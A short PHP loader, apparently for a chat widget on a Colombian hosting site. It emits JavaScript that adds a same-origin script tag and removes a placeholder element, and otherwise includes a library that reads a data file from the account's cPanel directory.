<?php
$debug=0;
if($debug){ini_set('display_errors', 1);error_reporting(E_ALL);}
if(@empty($_GET)){
echo "var jschatcolhost = document.createElement('script');";
echo "jschatcolhost.src = '/chatcolhost.php?".time()."';";
echo "document.body.appendChild(jschatcolhost);";
echo "var elemChatColHost = document.getElementById('chatcolhost12');";
echo "elemChatColHost.parentNode.removeChild(elemChatColHost);";
}else{
if((@include 'ChatColHost.php')!==false){
getChatColHost('/home/octago/.cpanel/nvdata/choctagono.com.co.data');
}else{
echo "console.log('Falta libreria');";}
}
?>